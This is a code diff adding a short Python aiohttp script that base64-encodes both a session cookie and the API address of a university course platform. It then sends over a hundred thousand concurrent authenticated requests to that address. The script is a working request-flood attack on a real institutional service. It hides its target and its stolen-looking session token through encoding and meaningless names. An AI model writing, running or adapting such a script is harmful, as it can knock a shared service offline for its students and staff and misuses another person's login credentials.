@@ -1,0 +1,20 @@
+import aiohttp
+import asyncio
+import base64
+
+async def leekit(_____a, _____b):
+    headers_dict = dict([abcc.strip().split(":", 1) for abcc in base64.b64decode('Q29va2llOiBzZXNzaW9uPVYyLTEtZDA0OWIxNDItOGRkZS00N2Q0LTliMTUtN2EyYjhmMzUxZmNkLk1qa3hOREl5LjE3NjE0MzAyNzQ4MzAuVnNzbGh3NGswMDV4djMyNk0wWUw4eW1BYnJBOw=='.encode('utf-8')).decode('utf-8').splitlines()])
+    async with _____b.get(
+        base64.b64decode('aHR0cHM6Ly90cm9uY2xhc3MubnRvdS5lZHUudHcvYXBpL3VzZXIvcmVjZW50bHktdmlzaXRlZC1jb3Vyc2Vz').decode('utf-8'),
+        headers=headers_dict
+    ) as resp:
+        print(_____a, await resp.text())
+async def main():
+    async with aiohttp.ClientSession() as session:
+        abc = [leekit(i, session) for i in range(114514)]
+        await asyncio.gather(*abc)
+
+asyncio.run(main())
+
+
+
